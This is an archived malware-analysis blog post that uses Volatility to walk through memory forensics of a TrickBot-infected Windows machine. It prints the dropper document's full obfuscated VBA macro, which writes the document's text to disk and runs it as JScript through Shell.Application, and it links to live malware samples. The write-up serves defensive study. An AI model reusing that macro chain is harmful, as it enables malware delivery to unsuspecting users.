{
    "id": "d59cfcc0-8c8e-4c44-b032-504852a4da36",
    "created_at": "2023-01-12T15:01:48.875941Z",
    "updated_at": "2025-03-27T02:13:01.583889Z",
    "deleted_at": null,
    "sha1_hash": "2bb14e46982f100b595377cb559d4765bd5dbecf",
    "title": "2019-08-26 - Memory Analysis of TrickBot",
    "authors": "",
    "file_creation_date": "2022-05-28T19:42:21Z",
    "file_modification_date": "2022-05-28T19:42:21Z",
    "file_size": 2889969,
    "plain_text": "# Memory Analysis of TrickBot\n\n**inquest.net/blog/2019/08/26/TrickBot-Memory-Analysis**\n\n\n-----\n\n[In this blog, we take a subtle dive into memory analysis using Volatility and the memory](https://www.volatilityfoundation.org/)\nanalysis methodology. For those unfamiliar with the tool, The Volatility Framework is a\ncompletely open collection of tools, implemented in Python for the extraction of digital\nartifacts from volatile memory (RAM) samples. The extraction techniques are performed\ncompletely independent of the system under investigation but offer visibility into the runtime\nstate of the system. The framework is intended to introduce people to the techniques and\ncomplexities associated with extracting digital artifacts from volatile memory samples and\nprovide a platform for further work into this exciting area of research.\n\nWhile we are unaware of the original creator, the Memory Analysis Framework for incident\n[response is often credited to Chad Tilbury and](https://twitter.com/chadtilbury) [Rob Lee and can be accomplished in these 6](https://twitter.com/robtlee)\nsteps.\n\n1. Identify Rogue Processes\n2. Analyze Process DLLs and Handles\n3. Review Network Artifacts\n4. Look for Evidence of Code Injection\n5. Check for Signs of a Rootkit\n6. Extract Processes, Drivers, and Objects\n\nThe original direction we had in my mind was to utilize “Fileless Malware” to highlight the\ndifferences in visibility compared to traditional malware. While perusing the Twitter for my\n[personal inspiration, there was numerous mentions of this new blog by Trend Micro](https://blog.trendmicro.com/trendlabs-security-intelligence/latest-trickbot-campaign-delivered-via-highly-obfuscated-js-file/)\ndiscussing a recent campaign spamming with a macro laden word doc with obfuscated\nJavaScript. This macro delivered a new variant of TrickBot to the victim. Developed in 2016,\nTrickBot is one of the more recent banking Trojans, with many of its original features inspired\nby [Dyreza (another banking Trojan). Besides targeting a wide array of international banks via](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/3139/the-dire-implications-of-dyreza)\nits webinjects, TrickBot can steal from Bitcoin wallets, and harvest emails or credentials\nusing the Mimikatz.\n\n### InQuest Labs\n\nCoincidentally, InQuest has just released a new analysis suite for the researcher and\nhobbyist. We are very excited about releasing this analysis suite to the community and hope\nit will provide some assistance to others. Welcome to [InQuest Labs! I want to take a moment](https://labs.inquest.net/)\nto highlight some of the analysis provided by the Deep File Inspection (DFI-LITE) capability\n[within InQuest Labs Definitely check out InQuest Labs and let us know what you think!](https://labs.inquest.net/)\n\n**Overview: Let’s start by reviewing one of the dropper Word documents that we will use later.**\n[MD5: 310731c5fce818f867bb0a32a1bec8be The overview is rather self explanatory.The red](https://labs.inquest.net/dfi/sha256/16429e95922c9521f7a40fa8f4c866444a060122448b243444dd2358a96a344c)\n“MALICIOUS” tag provides an immediate assertation of the safeness of the document. Of\ninterest is the “First Seen” date as which was earlier than the Trend Micro blog posted on\nAugust 5, 2019.\n\n\n-----\n\n**Heuristics: DFI provided some interesting heuristic actions exhibited by the file that was**\nanalyzed.\n\n**Layers: InQuest has developed a post-processing layer that parses common file types and**\nidentifies locations where other files or code can be embedded within the file that was\noriginally captured. For a given file, there is an average of 4X size increase to be analyzed.\n\n**Metadata: DFI provides the metadata associated with the sample being analyzed.** `File`\n```\nName : 666515eec773e200663fbd5fcad7109e9b97be11a83b41b8a4d73b7f5c8815ff File\nSize : 214 kB File Modification Date/Time : 2019:07:22 20:41:34+00:00 File\nAccess Date/Time : 2019:07:22 20:41:34+00:00 File Inode Change Date/Time :\n2019:07:22 20:41:34+00:00 File Permissions : rw-r--r-- File Type : ZIP File\nType Extension : zip MIME Type : application/zip Zip Required Version : 20\nZip Bit Flag : 0 Zip Compression : Deflated Zip Modify Date : 1980:01:01\n00:00:00 Zip CRC : 0xc6337d17 Zip Compressed Size : 501 Zip Uncompressed\nSize : 2645 Zip File Name : [Content_Types].xml File Name : image1.png File\nSize : 83 kB File Modification Date/Time : 1980:01:01 00:00:00+00:00 File\n\n```\n\n-----\n\n```\nAccess Date/Time : 2019:07:22 20:41:48+00:00 File Inode Change Date/Time :\n2019:07:22 20:42:03+00:00 File Permissions : rwxrwxrwx File Type : PNG File\nType Extension : png MIME Type : image/png Image Width : 1198 Image Height :\n486 Bit Depth : 8 Color Type : RGB Compression : Deflate/Inflate Filter :\nAdaptive Interlace : Noninterlaced SRGB Rendering : Perceptual Pixels Per\nUnit X : 3780 Pixels Per Unit Y : 3779 Pixel Units : meters Image Size :\n1198x486 Megapixels : 0.582\n\n```\n**Semantic Context: While the semantic content of this document is heavily obfuscated, it**\nprovides easy access for reversing and provides many quick wins for the personnel\nperforming continuous security monitoring at your organization.\n\n**Optical Character Recognition (OCR): InQuest Deep File Inspection (DFI) utilizes machine**\nvision and optical character recognition (OCR) to identify the social engineering component\nof a variety of malware lures.\n```\nw Document created in earlier version of MS Office Word\nTo view this content, please click |ab|Enable Editing|bb| from the yellow\nbar and then click |ab|Enable Content|bb|.\n\n```\n\n-----\n\n**Embedded Logic: DFI also provided the embedded Logic from within the document. Shown**\nhere is the macro content.\n```\nAttribute VB_Name = \"NewMacros\" 'Cadmium is a chemical element with the\nsymbol Cd and atomic number 48. 'This soft, silvery-white metal is\nchemically similar to the two other stable metals in group 12, zinc and\nmercury. 'Like zinc, it demonstrates oxidation state +2 in most of its\ncompounds, and like mercury, 'it has a lower melting point than the\ntransition metals in groups 3 through 11. 'Cadmium and its congeners in\ngroup 12 are often not considered transition metals, 'in that they do not\nhave partly filled d or f electron shells in the elemental or common\noxidation states. 'The average concentration of cadmium in Earths crust is\nbetween 0.1 and 0.5 parts per million (ppm). 'It was discovered in 1817\nsimultaneously by Stromeyer and Hermann, both in Germany, as an impurity in\nzinc carbonate.\nPublic Cadmium As String\nFunction OpenWord() OpenWord = \"o\" & \"p\" & \"e\" & \"n\" End Function\nSub Osaka(inside As Long) Dim Judge As String Dim Iun As Integer Dim spoof\nAs String Dim Ankara As String\nJudge = \"\" If True And (inside = 100) Then spoof = \"S\" & \"\" & \"hell\" Dim\naVar As Variant Dim iNum As Integer Dim DocumentType As Variant For Each\naVar In ActiveDocument.Variables If aVar.Name = \"DocumentType\" Then iNum =\naVar.Index Next aVar If iNum = 0 Then ' ActiveDocument.Variables.Add\nName:=\"DocumentType\", _ 'Value:=\"Letter\" Else\n'ActiveDocument.Variables(\"DocumentType\").Value = \"Letter\" End If Ankara =\n\"S\" & Chr(90 + 9) & \"r\" & \"ipt\"\nVBA.CallByName VBA.CreateObject(spoof & Chr(46) & Chr(60 + 5) & \"ppli\" &\nChr(90 + 9) & \"ation\"), _ spoof & \"Exe\" & Chr(89 + 10) & \"ute\", VbMethod,\n\"W\" & Ankara _, \"/\" & \"e:\" & \"J\" & Ankara & \" \" & Chr(40 - 6) & Cadmium &\nChr(40 - 6), Judge, OpenWord, 30 - 29 End If End Sub\nSub Dayoff(oreo As Long) Dim fedor As Integer fedor =\nActiveDocument.Variables.Count If True And (fedor = 0) And (oreo > 0) Then\nCadmium = Replace(ActiveDocument.FullName, \".d\" & \"o\" & Chr(99) & \"m\", \".d\"\n\n```\n\n-----\n\n```\n& at ) Dim vertu As String, hize As Long, android As Integer vertu =\nCadmium android = FreeFile Open vertu For Output As #android Print #android,\nActiveDocument.Content.Text Close #android End If End Sub\nAttribute VB_Name = \"ThisDocument\" Attribute VB_Base =\n\"1Normal.ThisDocument\" Attribute VB_GlobalNameSpace = False Attribute\nVB_Creatable = False Attribute VB_PredeclaredId = True Attribute VB_Exposed\n= True Attribute VB_TemplateDerived = True Attribute VB_Customizable = True\nPrivate Sub Document_Open() Dayoff 100 End Sub\nPrivate Sub Document_New()\nActiveDocument.Bookmarks(\"BookmarkName\").Range.InsertAfter _ \"Text\" End Sub\nPrivate Sub Document_Close() Osaka 100 End Sub\n\n## Moving on to Volatility\n\n```\nDue to all of the anti-reversing techniques included within the TrickBot droppers, analyzed\nmachine was infected with TrickBot executable that the dropper subsequently installed. You\ncan acquire a copy of the malware\n[0242ebb681eb1b3dbaa751320dea56e31c5e52c8324a7de125a8144cc5270698 if you would](https://github.com/InQuest/malware-samples/tree/master/2019-08-TrickBot)\nlike.\n\n[Feel free to download this memory image to follow along or expand on the investigation:](https://drive.google.com/file/d/1RC1Wrfn-OL7_8nyRUtAsNzlTCINL5fGw/view?usp=sharing)\n\n**Identify Image Context**\n\nWe need to start by identifying the system profile. In order to do this, we can start by using\nthe imageinfo plugin. While it provided a few different suggested profiles, it did not nail what\nwe needed. `vol.py -f trickbot-ram.img imangeinfo`\n\nWe can narrow the profile down utilizing the kdbgscan plugin by searching for and dumping\npotential KDBG values. Here we were able to identify the profile that we want to use for the\nrest of the analysis, profile=Win10x64_17763. `vol.py -f trickbot-ram.img kdbgscan`\n\n\n-----\n\nRather than specifying the image location and profile for every command, we can utilze\nexport to save the environment variables. `export`\n```\nVOLATILITY_LOCATION=file:///trickbot/trickbot-ram.img export\nVOLATILITY_PROFILE=Win10x64_17763\n\n```\n**Identify Rogue Processes We will start by looking through some of the standard plugins**\nthat relate to each section of the memory analysis process.\n\npslist – provides a high-level view of running processes.\n\nThere are some oddly named processes in this output as well as an abundance of terminal\nprocesses. `vol.py pslist`\n\n\n-----\n\npsscan – scan memory for EPROCESS blocks. `vol.py psscan`\n\n\n-----\n\npstree – display parent-process relationship\n\nThe process tree displays some of these interesting processes and shows the PIDs of their\nparent process. `vol.py pstree`\n\n\n-----\n\n**Analyze Process DLLS and handles**\ndlllist – List of loaded dlls by process.\nHere is a sample of the output from some of the suspect processes. Note the PEB is unable\nto be read for these processes, but works fine for others. Perhaps an anti-forensicating\ntechnique? `vol.py dlllist -p 10208,4324,10004,7904`\n\ngetsids – Print process security identifiers\nLooks like both of these suspicious processes were run with administrative privileges.\n\n```\nvol.py getsids -p 10208,10004\n\n```\n\n**Review Network Artifacts**\n\nnetscan – Scan for TCP connections and sockets\n\nThis plugin will highlight the network connections that were made. An excellent pivot point for\nadditional analysis and IOCs to be added into security monitoring.\n\n\n-----\n\n```\nvol.py netscan | grep -E LISTEN|ESTABLISHED|CLOSE|)\n\n```\n\n**Look for Evidence of code injection**\n\nMalfind – Find hidden and injected code.\n\nWhile looking through all of the processes, there is little indication of injected code. Often\napparent from the presence of MZ header `vol.py malfind -dump_dir /trickbot`\n\n**Check for signs of a rootkit**\n\nPsxview - Find hidden processes using cross-view analysis.\n\nHere is an assortment of suspicious processes that we identified earlier vol py psxview\n\n\n-----\n\nmodscan -Scan memory for loaded, unloaded, and unlinked drivers.\n\nI didn’t notice any suspicious drivers from the output. `vol.py modscan`\n\nThere are a handful of other plugins that can be used to look for rootkits on the system.\nSome of them are:apihooks, ssdt, driverirp, and idt. After some additional analysis, there\nappears to be no rootkit present on this system.\n\n**Dump suspicious processes and drivers**\n\nprocdump –Dump process to executable sample.\n\nInteresting results when trying to dump any of the suspicious processes. `vol.py procdump`\n```\n-p 10208 --dump-dir=./\n\n```\n\n-----\n\ncmdscan –Scan for COMMAND_HISTORY buffers.\nThere are no results from the command history. Extremely interesting considering the\nquantity of cmd.exe and powershell.exe instances. `vol.py cmdscan`\n\nconsoles –Scan for CONSOLE_INFORMATION output.\n\nAlso, no results from the consoles output. `vol.py consoles`\n\n### Conclusion\n\nIn this brief writeup, we looked at the memory analysis framework and attempted to utilize it\nto examine a system compromised with TrickBot. The anti-reversing techniques of the\ndelivery mechanism and anti-forensicating tricks used within the executable proved to inhibit\nsome of the analysis. While many more artifacts can be explored through memory analysis,\nthis was a high-level attempt to understand the flow of analysis using the tool. Please feel\n[free to continue on the investigation. Joe Sandbox also provides a detailed analysis report on](https://www.joesandbox.com/analysis/161291/0/html)\nthis instance.\n\n[We are beyond excited to announce InQuest Labs and know that it will be a valuable open-](https://labs.inquest.net/)\nsource resource for the community. Give it a gander when you have some free time.\n\nTags\n\n## Get The InQuest Insider\n\n[Find us on Twitter for frequent updates, follow our Blog for bi-weekly technical write-ups, or](https://twitter.com/inquest)\nsubscribe here to receive our monthly newsletter, The InQuest Insider. We curate and\nprovide you with the latest news stories, field notes about innovative malware, novel\nresearch / analysis / threat hunting tools, security tips and more.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-08-26 - Memory Analysis of TrickBot.pdf"
    ],
    "report_names": [
        "2019-08-26 - Memory Analysis of TrickBot.pdf"
    ],
    "threat_actors": [
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535708,
    "ts_updated_at": 1743041581,
    "ts_creation_date": 1653766941,
    "ts_modification_date": 1653766941,
    "files": {
        "pdf": "https://archive.orkl.eu/2bb14e46982f100b595377cb559d4765bd5dbecf.pdf",
        "text": "https://archive.orkl.eu/2bb14e46982f100b595377cb559d4765bd5dbecf.txt",
        "img": "https://archive.orkl.eu/2bb14e46982f100b595377cb559d4765bd5dbecf.jpg"
    }
}